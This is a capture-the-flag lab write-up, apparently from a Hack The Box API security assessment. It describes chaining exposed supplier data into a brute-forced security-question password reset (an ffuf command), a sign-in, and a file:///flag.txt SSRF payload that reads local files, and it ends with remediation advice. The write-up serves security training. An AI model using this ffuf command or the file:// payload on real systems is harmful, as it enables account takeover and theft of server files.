#  API-Attack - Skill Assessment

## Summary

Using the supplied credentials, I discovered that the `/api/v2/suppliers` endpoint returns supplier records containing sensitive fields (email, securityQuestion, etc.). This exposed data allows an attacker to perform a password reset attack using the security-question reset endpoint and ultimately sign in as a supplier. Additionally, the supplier profile endpoints permit setting a `ProfessionalCVPDFFileURI` that can be used to read local files (e.g., `file:///flag.txt`) resulting in an SSRF/local file disclosure scenario.

---

## Roles (from login)

```json
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll"
  ]
}
```

## Observation: Information Disclosure (BFLA-like)

A GET to `/api/v2/suppliers` returns supplier records with sensitive fields.

Example (truncated):

```json
{
  "suppliers": [
    {
      "id": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "James Allen",
      "email": "J.Allen1607@globalsolutions.com",
      "securityQuestion": "SupplierDidNotProvideYet",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    ...
  ]
}
```

Because security questions and email addresses are exposed, an attacker can attempt account takeover by guessing answers to the security question and resetting passwords for supplier accounts.

---

## Password-reset endpoint (suppliers)

```
POST /api/v2/authentication/suppliers/passwords/resets/security-question-answers
Content-Type: application/json

{
  "SupplierEmail": "target@example.com",
  "SecurityQuestionAnswer": "answer",
  "NewPassword": "AStrongPassword123!"
}
```

The role used during reconnaissance indicates supplier access (not customer). The exposed `securityQuestion` values (e.g. "What is your favorite color?") make this attack feasible using a focused wordlist.

---

## Wordlists used

* Colors list (example): [https://gist.github.com/mordka/c65affdefccb7264efff77b836b5e717](https://gist.github.com/mordka/c65affdefccb7264efff77b836b5e717)
* Email list (extracted from `/api/v2/suppliers`):

  * `P.Howard1536@globalsolutions.com`
  * `L.Walker1872@globalsolutions.com`
  * `T.Harris1814@globalsolutions.com`
  * `B.Rogers1535@globalsolutions.com`

---

## Automated testing (ffuf)

Command used to brute-force SecurityQuestion answers and email combinations with `ffuf`:

```bash
ffuf -u http://94.237.55.43:33740/api/v2/authentication/suppliers/passwords/resets/security-question-answers \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"SupplierEmail":"FUZZ-EMAIL","SecurityQuestionAnswer":"FUZZ-Q","NewPassword":"AStrongPassword123!"}' \
  -w email.txt:FUZZ-EMAIL \
  -w colors-list.txt:FUZZ-Q -fs 23
```

Observed `ffuf` result (example):

```
[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 191ms]
  * FUZZ-EMAIL: B.Rogers1535@globalsolutions.com
  * FUZZ-Q: rust
```

This indicates the reset accepted the provided security answer and set the new password.

---

## Sign-in with reset password

After a successful reset, I authenticated to the supplier sign-in endpoint:

```bash
curl -i -s -k -X POST \
  -H 'accept: application/json' -H 'Content-Type: application/json' \
  --data-binary $'{\n  "Email": "B.Rogers1535@globalsolutions.com",\n  "Password": "AStrongPassword123!"\n}' \
  'http://94.237.55.43:33740/api/v2/authentication/suppliers/sign-in'
```

Result: successful login. The account in this case had no roles assigned, but access to `current-user` supplier endpoints was available.

---

## CV upload / SSRF & local file read

Endpoints of interest:

* `POST /api/v2/suppliers/current-user/cv` — upload a PDF CV
* `GET  /api/v2/suppliers/current-user/cv` — returns the uploaded file (base64)
* `PATCH /api/v2/suppliers/current-user` — update fields including `ProfessionalCVPDFFileURI`

By setting `ProfessionalCVPDFFileURI` to `file:///flag.txt` via the PATCH request, the GET endpoint returned the contents of the referenced file (base64). This demonstrates a path to read local files (SSRF/local file disclosure).

Example PATCH payload:

```json
{
  "SecurityQuestion": "string",
  "SecurityQuestionAnswer": "string",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "string",
  "Password": "string"
}
```

After the update, `GET /api/v2/suppliers/current-user/cv` returned the file content (base64) which decodes to the sensitive file.

---

## Impact

1. **Account takeover** — Exposed emails and security questions allow brute-forcing/guessing answers and resetting supplier passwords. Successful password resets enable authentication as a supplier.
2. **Local file disclosure / SSRF** — `ProfessionalCVPDFFileURI` can be abused to retrieve arbitrary files accessible by the application (e.g., `file://` scheme), exposing secrets or flags.
3. **Data leakage** — Supplier PII (emails, possibly other profile data) is exposed to any authenticated account with `Suppliers_Get*` privileges.

---

## Proof-of-Concept (PoC) Steps (high-level)

1. Login with provided credentials (`HTBPentester`) to obtain role `Suppliers_Get`/`Suppliers_GetAll`.
2. `GET /api/v2/suppliers` — enumerate suppliers and collect `email` and `securityQuestion` values.
3. Build wordlists: `email.txt` (from step 2) and `colors-list.txt` (targeting color question answers).
4. Use `ffuf` (or similar) to POST combinations to `/api/v2/authentication/suppliers/passwords/resets/security-question-answers` until you find a successful reset (HTTP 200 and different response size/code).
5. Sign in as the target supplier using the newly set password via `/api/v2/authentication/suppliers/sign-in`.
6. `PATCH /api/v2/suppliers/current-user` — set `ProfessionalCVPDFFileURI` to `file:///path/to/local/file`.
7. `GET /api/v2/suppliers/current-user/cv` — retrieve base64 of the file and decode it offline to reveal file contents.

---

## Recommendations / Remediation

**Immediate fixes**

* Remove sensitive data (security question/answer, full email) from supplier list responses unless absolutely required. Return minimal profile identifiers instead.
* Disable password reset via security question answers, or at minimum require a second factor (OTP sent to verified email/phone) and rate-limit attempts.
* Add strict validation and allow-listing for `ProfessionalCVPDFFileURI`. Do not allow `file://` or other internal schemes. Accept only uploaded/stored resource IDs (not arbitrary URIs).
* Enforce strong rate-limiting and logging on password-reset endpoints and block rapid automated attempts.

**Longer-term / defensive measures**

* Implement MFA for sensitive account recovery and privileged actions.
* Remove security questions as a recovery mechanism or store hashed/peppered answers and require additional verification.
* Harden access controls: ensure `Suppliers_Get*` roles do not expose unnecessary PII.
* Conduct an API security review and add input validation on all URI parameters that may reference internal resources (to prevent SSRF/local-file access).

---

## Severity

* **Account takeover (password reset abuse): High** — direct ability to take ownership of supplier accounts.
* **SSRF / local file disclosure via CV URI: High** — arbitrary file reads can disclose secrets.
* **Information disclosure (PII): Medium-High** — E.g., email addresses and security question text are exposed.

---

## Notes

* Do not use discovered credentials on production systems or systems outside the scope of the engagement.
* All testing was performed against the target environment noted above.

---

*End of report.*
